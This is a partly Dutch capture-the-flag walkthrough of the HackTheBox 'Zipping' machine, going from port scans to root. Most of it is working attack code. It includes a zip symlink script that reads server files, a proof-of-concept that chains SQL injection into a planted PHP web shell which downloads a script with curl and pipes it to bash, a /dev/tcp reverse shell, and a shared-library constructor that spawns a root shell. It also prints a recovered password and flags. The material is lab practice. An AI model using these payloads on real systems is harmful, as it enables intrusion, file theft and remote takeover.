# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.229.87                                                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:04 CET
Nmap scan report for 10.129.229.87
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,80 -sCV 10.129.229.87 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 19:05 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Initiating Ping Scan at 19:05
Scanning 10.129.229.87 [4 ports]
Completed Ping Scan at 19:05, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:05
Completed Parallel DNS resolution of 1 host. at 19:05, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:05
Scanning 10.129.229.87 [2 ports]
Discovered open port 22/tcp on 10.129.229.87
Discovered open port 80/tcp on 10.129.229.87
Completed SYN Stealth Scan at 19:05, 0.08s elapsed (2 total ports)
Initiating Service scan at 19:05
Scanning 2 services on 10.129.229.87
Completed Service scan at 19:05, 6.09s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.229.87.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 1.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.16s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Nmap scan report for 10.129.229.87
Host is up, received echo-reply ttl 63 (0.030s latency).
Scanned at 2025-02-20 19:05:05 CET for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
|   256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

Ik ben naar de webpage geweest en daar heb ik gezien dat er zip files kunnen worden upgeload.. Ik ben dit gaan misbruiken voor het /etc/passwd file te zien vanop de server. Ik ben dit gaan doen door de volgende code te gebruiken die dat ik van uit de volgende bron heb gehaald. https://humble-raptor-f30.notion.site/Symlink-Sabotage-ZIPping-Through-Web-Security-a1e93524ee374a16934286df0e20765d

UITLEGGEN WAT DE CODE GAAT DOEN.

```
import requests
import io
import zipfile
import stat

def create_zip(target_file):
    payload = io.BytesIO()
    zipInfo = zipfile.ZipInfo('evil.pdf')
    zipInfo.create_system=3
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    zipInfo.external_attr = unix_st_mode << 16
    zipOut = zipfile.ZipFile(payload, 'w', compression=zipfile.ZIP_DEFLATED)
    zipOut.writestr(zipInfo, target_file)
    zipOut.close()
    return payload.getvalue()

with open('newfile.zip','wb') as f:
        f.write(create_zip('/etc/passwd'))

```

Ik ben na de code het zip bestand gaan uploaden op de webpagina.

![[Pasted image 20250320211357.png]]

Ik ben vanuit de browser de url link gaan halen en heb ik op mijn machine het volgende commando uitgevoerd zodat ik kan gaan zien wat er nu in de pdf file staat.

```
curl http://10.129.229.87/uploads/1788e6fc2fb7e6e6d92eed9c5e3771de/evil.pdf 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

Hier kunnen we zien dat de user rektsu heel waarschijnlijk de user zal zijn waar dat we user.txt file zullen moeten gaan zoeken. Ik ben dus nu gaan zoeken naar wat de webroot dir zal zijn. Dit ben ik gaan doen door naar de default apache file te gaan in de ssh server. 

```
/etc/apache2/sites-available/000-default.conf
```

Ik ben deze path gaan aanpassen in het script weer hetzelfde gedaan als ervoor. Door het script uittevoeren en het te gaan bekijken heb ik gezien dat het documenroot path "/var/www/html" is.

```
curl http://10.129.229.87/uploads/c52a4420c37bc6b039e2e714315e64d9/evil.pdf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        <Directory /var/www/html/uploads>
                Options -Indexes
        </Directory>

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

nu heb ik dit ook kunnen gebruiken voor de user.txt flag te pakken te krijgen.

user flag = 92ec0d792236afacd5e49cd22dcc6392

```
curl http://10.129.229.87/uploads/e790ebfc71988f138193198234c40932/evil.pdf
92ec0d792236afacd5e49cd22dcc6392
```

Nu moet ik wel nog de connectie met de ssh server maken. Dit zal ik gaan doen aan de hand van de volgende code:

```
cat HTB_Zipping_poc.py      
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>")
    sys.exit(1)

fnb = random.randint(10, 10000)
url = "http://zipping.htb/"

session = requests.Session()

print("[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp " + f"{sys.argv[2]}")

print("[+] Write php shell /var/lib/mysql/rvsl" + str(fnb) + ".php")

with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
phpshell = session.get(url + f"shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231")

print("[+] Get Reverse Shell")

phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}")

proc.terminate()

```

Nu dat ik de rev shell heb, ben ik eerst het sudo -l commando gaan uitvoeren. Hierbij zal je kunnen zien dat we /usr/bin/stock kunnen gebruiken zonder het root password te moeten gebruiken.

```
sudo -l
sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Ik ben het commando "sudo /usr/bin/stock" gaan gebruiken maa, ik moest een password hebben voor in te kunnen loggen. Hiervoor ben ik het volgende commando gaan gebruiken waar dat ik het password in heb gevonden. Wat doet het commando nu juist, 

Password: St0ckM4nager

```
rektsu@zipping:/var/www/html/shop$ strings /usr/bin/stock
strings /usr/bin/stock                                                                                              
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password:
```


```
cat libcounter.c      
#include <stdlib.h>
__attribute__ ((__constructor__))
void shell(void){
    system("/bin/bash");
}
```

```
wget http://10.10.16.3:8001/libcounter.c
```

```
gcc -shared -o libcounter.so -fPIC libcounter.c
```


```
cat /root/root.txt
cat /root/root.txt
2680df25d3630508865bab737ed233e1
```

![[Pasted image 20250322085635.png]]